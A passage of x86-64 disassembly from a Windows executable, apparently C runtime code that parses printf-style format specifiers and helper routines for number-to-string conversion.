   140006243:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   14000624a:	48 89 c1             	mov    %rax,%rcx
   14000624d:	e8 06 ef ff ff       	call   0x140005158
   140006252:	e9 47 f9 ff ff       	jmp    0x140005b9e
   140006257:	8b 45 a8             	mov    -0x58(%rbp),%eax
   14000625a:	83 c8 20             	or     $0x20,%eax
   14000625d:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006260:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006263:	83 e0 04             	and    $0x4,%eax
   140006266:	85 c0                	test   %eax,%eax
   140006268:	74 2f                	je     0x140006299
   14000626a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000626e:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006272:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006276:	48 8b 00             	mov    (%rax),%rax
   140006279:	db 28                	fldt   (%rax)
   14000627b:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   140006281:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006285:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   14000628c:	48 89 c1             	mov    %rax,%rcx
   14000628f:	e8 f4 ed ff ff       	call   0x140005088
   140006294:	e9 05 f9 ff ff       	jmp    0x140005b9e
   140006299:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000629d:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400062a1:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400062a5:	f2 0f 10 10          	movsd  (%rax),%xmm2
   1400062a9:	f2 0f 11 95 58 ff ff 	movsd  %xmm2,-0xa8(%rbp)
   1400062b0:	ff 
   1400062b1:	dd 85 58 ff ff ff    	fldl   -0xa8(%rbp)
   1400062b7:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   1400062bd:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   1400062c1:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   1400062c8:	48 89 c1             	mov    %rax,%rcx
   1400062cb:	e8 b8 ed ff ff       	call   0x140005088
   1400062d0:	e9 c9 f8 ff ff       	jmp    0x140005b9e
   1400062d5:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400062d8:	83 c8 20             	or     $0x20,%eax
   1400062db:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400062de:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400062e1:	83 e0 04             	and    $0x4,%eax
   1400062e4:	85 c0                	test   %eax,%eax
   1400062e6:	74 2f                	je     0x140006317
   1400062e8:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400062ec:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400062f0:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400062f4:	48 8b 00             	mov    (%rax),%rax
   1400062f7:	db 28                	fldt   (%rax)
   1400062f9:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   1400062ff:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006303:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   14000630a:	48 89 c1             	mov    %rax,%rcx
   14000630d:	e8 f1 ee ff ff       	call   0x140005203
   140006312:	e9 87 f8 ff ff       	jmp    0x140005b9e
   140006317:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000631b:	48 8d 50 08          	lea    0x8(%rax),%rdx
   14000631f:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006323:	f2 0f 10 18          	movsd  (%rax),%xmm3
   140006327:	f2 0f 11 9d 58 ff ff 	movsd  %xmm3,-0xa8(%rbp)
   14000632e:	ff 
   14000632f:	dd 85 58 ff ff ff    	fldl   -0xa8(%rbp)
   140006335:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   14000633b:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   14000633f:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140006346:	48 89 c1             	mov    %rax,%rcx
   140006349:	e8 b5 ee ff ff       	call   0x140005203
   14000634e:	e9 4b f8 ff ff       	jmp    0x140005b9e
   140006353:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006356:	83 c8 20             	or     $0x20,%eax
   140006359:	89 45 a8             	mov    %eax,-0x58(%rbp)
   14000635c:	8b 45 a8             	mov    -0x58(%rbp),%eax
   14000635f:	83 e0 04             	and    $0x4,%eax
   140006362:	85 c0                	test   %eax,%eax
   140006364:	74 2f                	je     0x140006395
   140006366:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000636a:	48 8d 50 08          	lea    0x8(%rax),%rdx
   14000636e:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006372:	48 8b 00             	mov    (%rax),%rax
   140006375:	db 28                	fldt   (%rax)
   140006377:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   14000637d:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006381:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140006388:	48 89 c1             	mov    %rax,%rcx
   14000638b:	e8 23 f5 ff ff       	call   0x1400058b3
   140006390:	e9 09 f8 ff ff       	jmp    0x140005b9e
   140006395:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006399:	48 8d 50 08          	lea    0x8(%rax),%rdx
   14000639d:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400063a1:	48 8b 00             	mov    (%rax),%rax
   1400063a4:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   1400063a8:	66 48 0f 6e c0       	movq   %rax,%xmm0
   1400063ad:	e8 1a f6 ff ff       	call   0x1400059cc
   1400063b2:	e9 e7 f7 ff ff       	jmp    0x140005b9e
   1400063b7:	83 7d f8 05          	cmpl   $0x5,-0x8(%rbp)
   1400063bb:	75 1b                	jne    0x1400063d8
   1400063bd:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
   1400063c0:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400063c4:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400063c8:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400063cc:	48 8b 00             	mov    (%rax),%rax
   1400063cf:	89 ca                	mov    %ecx,%edx
   1400063d1:	88 10                	mov    %dl,(%rax)
   1400063d3:	e9 c6 f7 ff ff       	jmp    0x140005b9e
   1400063d8:	83 7d f8 01          	cmpl   $0x1,-0x8(%rbp)
   1400063dc:	75 1c                	jne    0x1400063fa
   1400063de:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
   1400063e1:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400063e5:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400063e9:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400063ed:	48 8b 00             	mov    (%rax),%rax
   1400063f0:	89 ca                	mov    %ecx,%edx
   1400063f2:	66 89 10             	mov    %dx,(%rax)
   1400063f5:	e9 a4 f7 ff ff       	jmp    0x140005b9e
   1400063fa:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   1400063fe:	75 19                	jne    0x140006419
   140006400:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006404:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006408:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   14000640c:	48 8b 00             	mov    (%rax),%rax
   14000640f:	8b 55 c4             	mov    -0x3c(%rbp),%edx
   140006412:	89 10                	mov    %edx,(%rax)
   140006414:	e9 85 f7 ff ff       	jmp    0x140005b9e
   140006419:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
   14000641d:	75 1d                	jne    0x14000643c
   14000641f:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
   140006422:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006426:	48 8d 50 08          	lea    0x8(%rax),%rdx
   14000642a:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   14000642e:	48 8b 00             	mov    (%rax),%rax
   140006431:	48 63 d1             	movslq %ecx,%rdx
   140006434:	48 89 10             	mov    %rdx,(%rax)
   140006437:	e9 62 f7 ff ff       	jmp    0x140005b9e
   14000643c:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006440:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006444:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006448:	48 8b 00             	mov    (%rax),%rax
   14000644b:	8b 55 c4             	mov    -0x3c(%rbp),%edx
   14000644e:	89 10                	mov    %edx,(%rax)
   140006450:	e9 49 f7 ff ff       	jmp    0x140005b9e
   140006455:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006459:	0f b6 00             	movzbl (%rax),%eax
   14000645c:	3c 68                	cmp    $0x68,%al
   14000645e:	75 0e                	jne    0x14000646e
   140006460:	48 83 45 28 01       	addq   $0x1,0x28(%rbp)
   140006465:	c7 45 f8 05 00 00 00 	movl   $0x5,-0x8(%rbp)
   14000646c:	eb 07                	jmp    0x140006475
   14000646e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   140006475:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   14000647c:	e9 ea 02 00 00       	jmp    0x14000676b
   140006481:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   140006488:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   14000648f:	e9 d7 02 00 00       	jmp    0x14000676b
   140006494:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006498:	0f b6 00             	movzbl (%rax),%eax
   14000649b:	3c 36                	cmp    $0x36,%al
   14000649d:	75 1d                	jne    0x1400064bc
   14000649f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400064a3:	48 83 c0 01          	add    $0x1,%rax
   1400064a7:	0f b6 00             	movzbl (%rax),%eax
   1400064aa:	3c 34                	cmp    $0x34,%al
   1400064ac:	75 0e                	jne    0x1400064bc
   1400064ae:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   1400064b5:	48 83 45 28 02       	addq   $0x2,0x28(%rbp)
   1400064ba:	eb 2f                	jmp    0x1400064eb
   1400064bc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400064c0:	0f b6 00             	movzbl (%rax),%eax
   1400064c3:	3c 33                	cmp    $0x33,%al
   1400064c5:	75 1d                	jne    0x1400064e4
   1400064c7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400064cb:	48 83 c0 01          	add    $0x1,%rax
   1400064cf:	0f b6 00             	movzbl (%rax),%eax
   1400064d2:	3c 32                	cmp    $0x32,%al
   1400064d4:	75 0e                	jne    0x1400064e4
   1400064d6:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   1400064dd:	48 83 45 28 02       	addq   $0x2,0x28(%rbp)
   1400064e2:	eb 07                	jmp    0x1400064eb
   1400064e4:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   1400064eb:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   1400064f2:	e9 74 02 00 00       	jmp    0x14000676b
   1400064f7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400064fb:	0f b6 00             	movzbl (%rax),%eax
   1400064fe:	3c 6c                	cmp    $0x6c,%al
   140006500:	75 0e                	jne    0x140006510
   140006502:	48 83 45 28 01       	addq   $0x1,0x28(%rbp)
   140006507:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   14000650e:	eb 07                	jmp    0x140006517
   140006510:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   140006517:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   14000651e:	e9 48 02 00 00       	jmp    0x14000676b
   140006523:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006526:	83 c8 04             	or     $0x4,%eax
   140006529:	89 45 a8             	mov    %eax,-0x58(%rbp)
   14000652c:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   140006533:	e9 33 02 00 00       	jmp    0x14000676b
   140006538:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   14000653f:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   140006546:	e9 20 02 00 00       	jmp    0x14000676b
   14000654b:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   140006552:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   140006559:	e9 0d 02 00 00       	jmp    0x14000676b
   14000655e:	83 7d fc 01          	cmpl   $0x1,-0x4(%rbp)
   140006562:	77 1f                	ja     0x140006583
   140006564:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
   14000656b:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   14000656f:	48 83 c0 10          	add    $0x10,%rax
   140006573:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006577:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%rbp)
   14000657e:	e9 e8 01 00 00       	jmp    0x14000676b
   140006583:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   14000658a:	e9 dc 01 00 00       	jmp    0x14000676b
   14000658f:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140006594:	74 4c                	je     0x1400065e2
   140006596:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000659a:	74 06                	je     0x1400065a2
   14000659c:	83 7d fc 02          	cmpl   $0x2,-0x4(%rbp)
   1400065a0:	75 40                	jne    0x1400065e2
   1400065a2:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400065a6:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400065aa:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400065ae:	8b 10                	mov    (%rax),%edx
   1400065b0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400065b4:	89 10                	mov    %edx,(%rax)
   1400065b6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400065ba:	8b 00                	mov    (%rax),%eax
   1400065bc:	85 c0                	test   %eax,%eax
   1400065be:	79 29                	jns    0x1400065e9
   1400065c0:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400065c4:	75 13                	jne    0x1400065d9
   1400065c6:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400065c9:	80 cc 04             	or     $0x4,%ah
   1400065cc:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400065cf:	8b 45 ac             	mov    -0x54(%rbp),%eax
   1400065d2:	f7 d8                	neg    %eax
   1400065d4:	89 45 ac             	mov    %eax,-0x54(%rbp)
   1400065d7:	eb 10                	jmp    0x1400065e9
   1400065d9:	c7 45 b0 ff ff ff ff 	movl   $0xffffffff,-0x50(%rbp)
   1400065e0:	eb 07                	jmp    0x1400065e9
   1400065e2:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   1400065e9:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   1400065f0:	00 
   1400065f1:	e9 75 01 00 00       	jmp    0x14000676b
   1400065f6:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400065fa:	0f 85 5e 01 00 00    	jne    0x14000675e
   140006600:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006603:	80 cc 08             	or     $0x8,%ah
   140006606:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006609:	e9 50 01 00 00       	jmp    0x14000675e
   14000660e:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140006612:	0f 85 49 01 00 00    	jne    0x140006761
   140006618:	8b 45 a8             	mov    -0x58(%rbp),%eax
   14000661b:	80 cc 01             	or     $0x1,%ah
   14000661e:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006621:	e9 3b 01 00 00       	jmp    0x140006761
   140006626:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000662a:	0f 85 34 01 00 00    	jne    0x140006764
   140006630:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006633:	80 cc 04             	or     $0x4,%ah
   140006636:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006639:	e9 26 01 00 00       	jmp    0x140006764
   14000663e:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140006642:	0f 85 1f 01 00 00    	jne    0x140006767
   140006648:	8b 45 a8             	mov    -0x58(%rbp),%eax
   14000664b:	80 cc 10             	or     $0x10,%ah
   14000664e:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006651:	48 8d 45 84          	lea    -0x7c(%rbp),%rax
   140006655:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000665b:	ba 00 00 00 00       	mov    $0x0,%edx
   140006660:	48 89 c1             	mov    %rax,%rcx
   140006663:	e8 98 3a 00 00       	call   0x14000a100
   140006668:	e8 7b 3a 00 00       	call   0x14000a0e8
   14000666d:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140006671:	48 8d 4d 84          	lea    -0x7c(%rbp),%rcx
   140006675:	48 8d 45 8c          	lea    -0x74(%rbp),%rax
   140006679:	49 89 c9             	mov    %rcx,%r9
   14000667c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140006682:	48 89 c1             	mov    %rax,%rcx
   140006685:	e8 44 37 00 00       	call   0x140009dce
   14000668a:	89 45 dc             	mov    %eax,-0x24(%rbp)
   14000668d:	83 7d dc 00          	cmpl   $0x0,-0x24(%rbp)
   140006691:	7e 08                	jle    0x14000669b
   140006693:	0f b7 45 8c          	movzwl -0x74(%rbp),%eax
   140006697:	66 89 45 c0          	mov    %ax,-0x40(%rbp)
   14000669b:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000669e:	89 45 bc             	mov    %eax,-0x44(%rbp)
   1400066a1:	e9 c1 00 00 00       	jmp    0x140006767
   1400066a6:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400066aa:	0f 85 ba 00 00 00    	jne    0x14000676a
   1400066b0:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400066b3:	83 c8 40             	or     $0x40,%eax
   1400066b6:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400066b9:	e9 ac 00 00 00       	jmp    0x14000676a
   1400066be:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400066c2:	75 0e                	jne    0x1400066d2
   1400066c4:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400066c7:	80 cc 02             	or     $0x2,%ah
   1400066ca:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400066cd:	e9 99 00 00 00       	jmp    0x14000676b
   1400066d2:	83 7d fc 03          	cmpl   $0x3,-0x4(%rbp)
   1400066d6:	77 68                	ja     0x140006740
   1400066d8:	83 7d e8 39          	cmpl   $0x39,-0x18(%rbp)
   1400066dc:	7f 62                	jg     0x140006740
   1400066de:	83 7d e8 2f          	cmpl   $0x2f,-0x18(%rbp)
   1400066e2:	7e 5c                	jle    0x140006740
   1400066e4:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400066e8:	75 09                	jne    0x1400066f3
   1400066ea:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   1400066f1:	eb 0d                	jmp    0x140006700
   1400066f3:	83 7d fc 02          	cmpl   $0x2,-0x4(%rbp)
   1400066f7:	75 07                	jne    0x140006700
   1400066f9:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%rbp)
   140006700:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140006705:	74 64                	je     0x14000676b
   140006707:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000670b:	8b 00                	mov    (%rax),%eax
   14000670d:	85 c0                	test   %eax,%eax
   14000670f:	79 0e                	jns    0x14000671f
   140006711:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140006714:	8d 50 d0             	lea    -0x30(%rax),%edx
   140006717:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000671b:	89 10                	mov    %edx,(%rax)
   14000671d:	eb 4c                	jmp    0x14000676b
   14000671f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006723:	8b 10                	mov    (%rax),%edx
   140006725:	89 d0                	mov    %edx,%eax
   140006727:	c1 e0 02             	shl    $0x2,%eax
   14000672a:	01 d0                	add    %edx,%eax
   14000672c:	01 c0                	add    %eax,%eax
   14000672e:	89 c2                	mov    %eax,%edx
   140006730:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140006733:	01 d0                	add    %edx,%eax
   140006735:	8d 50 d0             	lea    -0x30(%rax),%edx
   140006738:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000673c:	89 10                	mov    %edx,(%rax)
   14000673e:	eb 2b                	jmp    0x14000676b
   140006740:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140006744:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140006748:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   14000674c:	48 89 c2             	mov    %rax,%rdx
   14000674f:	b9 25 00 00 00       	mov    $0x25,%ecx
   140006754:	e8 37 d4 ff ff       	call   0x140003b90
   140006759:	e9 40 f4 ff ff       	jmp    0x140005b9e
   14000675e:	90                   	nop
   14000675f:	eb 0a                	jmp    0x14000676b
   140006761:	90                   	nop
   140006762:	eb 07                	jmp    0x14000676b
   140006764:	90                   	nop
   140006765:	eb 04                	jmp    0x14000676b
   140006767:	90                   	nop
   140006768:	eb 01                	jmp    0x14000676b
   14000676a:	90                   	nop
   14000676b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000676f:	0f b6 00             	movzbl (%rax),%eax
   140006772:	84 c0                	test   %al,%al
   140006774:	0f 85 6d f4 ff ff    	jne    0x140005be7
   14000677a:	eb 0e                	jmp    0x14000678a
   14000677c:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006780:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140006783:	89 c1                	mov    %eax,%ecx
   140006785:	e8 06 d4 ff ff       	call   0x140003b90
   14000678a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000678e:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140006792:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140006796:	0f b6 00             	movzbl (%rax),%eax
   140006799:	0f be c0             	movsbl %al,%eax
   14000679c:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000679f:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
   1400067a3:	0f 85 fa f3 ff ff    	jne    0x140005ba3
   1400067a9:	8b 45 c4             	mov    -0x3c(%rbp),%eax
   1400067ac:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   1400067b3:	5d                   	pop    %rbp
   1400067b4:	c3                   	ret
   1400067b5:	90                   	nop
   1400067b6:	90                   	nop
   1400067b7:	90                   	nop
   1400067b8:	90                   	nop
   1400067b9:	90                   	nop
   1400067ba:	90                   	nop
   1400067bb:	90                   	nop
   1400067bc:	90                   	nop
   1400067bd:	90                   	nop
   1400067be:	90                   	nop
   1400067bf:	90                   	nop
   1400067c0:	55                   	push   %rbp
   1400067c1:	48 89 e5             	mov    %rsp,%rbp
   1400067c4:	48 83 ec 30          	sub    $0x30,%rsp
   1400067c8:	89 4d 10             	mov    %ecx,0x10(%rbp)
   1400067cb:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%rbp)
   1400067d2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   1400067d9:	eb 07                	jmp    0x1400067e2
   1400067db:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
   1400067df:	d1 65 fc             	shll   $1,-0x4(%rbp)
   1400067e2:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400067e5:	83 c0 17             	add    $0x17,%eax
   1400067e8:	39 45 10             	cmp    %eax,0x10(%rbp)
   1400067eb:	7f ee                	jg     0x1400067db
   1400067ed:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400067f0:	89 c1                	mov    %eax,%ecx
   1400067f2:	e8 56 1e 00 00       	call   0x14000864d
   1400067f7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400067fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400067ff:	8b 55 f8             	mov    -0x8(%rbp),%edx
   140006802:	89 10                	mov    %edx,(%rax)
   140006804:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006808:	48 83 c0 04          	add    $0x4,%rax
   14000680c:	48 83 c4 30          	add    $0x30,%rsp
   140006810:	5d                   	pop    %rbp
   140006811:	c3                   	ret
   140006812:	55                   	push   %rbp
   140006813:	48 89 e5             	mov    %rsp,%rbp
   140006816:	48 83 ec 30          	sub    $0x30,%rsp
   14000681a:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000681e:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140006822:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140006826:	8b 45 20             	mov    0x20(%rbp),%eax
   140006829:	89 c1                	mov    %eax,%ecx
   14000682b:	e8 90 ff ff ff       	call   0x1400067c0
   140006830:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006834:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006838:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000683c:	eb 05                	jmp    0x140006843
   14000683e:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
   140006843:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006847:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000684b:	48 89 55 10          	mov    %rdx,0x10(%rbp)
   14000684f:	0f b6 10             	movzbl (%rax),%edx
   140006852:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140006856:	88 10                	mov    %dl,(%rax)
   140006858:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000685c:	0f b6 00             	movzbl (%rax),%eax
   14000685f:	84 c0                	test   %al,%al
   140006861:	75 db                	jne    0x14000683e
   140006863:	48 83 7d 18 00       	cmpq   $0x0,0x18(%rbp)
   140006868:	74 0b                	je     0x140006875
   14000686a:	48 8b 45 18          	mov    0x18(%rbp),%rax
   14000686e:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140006872:	48 89 10             	mov    %rdx,(%rax)
   140006875:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006879:	48 83 c4 30          	add    $0x30,%rsp
   14000687d:	5d                   	pop    %rbp
   14000687e:	c3                   	ret
   14000687f:	55                   	push   %rbp
   140006880:	48 89 e5             	mov    %rsp,%rbp
   140006883:	48 83 ec 30          	sub    $0x30,%rsp
   140006887:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000688b:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000688f:	48 83 e8 04          	sub    $0x4,%rax
   140006893:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006897:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000689b:	8b 10                	mov    (%rax),%edx
   14000689d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400068a1:	89 50 08             	mov    %edx,0x8(%rax)
   1400068a4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400068a8:	8b 40 08             	mov    0x8(%rax),%eax
   1400068ab:	ba 01 00 00 00       	mov    $0x1,%edx
   1400068b0:	89 c1                	mov    %eax,%ecx
   1400068b2:	d3 e2                	shl    %cl,%edx
   1400068b4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400068b8:	89 50 0c             	mov    %edx,0xc(%rax)
   1400068bb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400068bf:	48 89 c1             	mov    %rax,%rcx
   1400068c2:	e8 c7 1e 00 00       	call   0x14000878e
   1400068c7:	90                   	nop
   1400068c8:	48 83 c4 30          	add    $0x30,%rsp
   1400068cc:	5d                   	pop    %rbp
   1400068cd:	c3                   	ret
   1400068ce:	55                   	push   %rbp
   1400068cf:	48 89 e5             	mov    %rsp,%rbp
   1400068d2:	48 83 ec 70          	sub    $0x70,%rsp
   1400068d6:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400068da:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400068de:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400068e2:	8b 40 14             	mov    0x14(%rax),%eax
   1400068e5:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400068e8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400068ec:	8b 40 14             	mov    0x14(%rax),%eax
   1400068ef:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   1400068f2:	7e 0a                	jle    0x1400068fe
   1400068f4:	b8 00 00 00 00       	mov    $0x0,%eax
   1400068f9:	e9 3f 02 00 00       	jmp    0x140006b3d
   1400068fe:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140006902:	48 83 c0 18          	add    $0x18,%rax
   140006906:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000690a:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   14000690e:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006911:	48 98                	cltq
   140006913:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   14000691a:	00 
   14000691b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000691f:	48 01 d0             	add    %rdx,%rax
   140006922:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140006926:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000692a:	48 83 c0 18          	add    $0x18,%rax
   14000692e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006932:	8b 45 fc             	mov    -0x4(%rbp),%eax
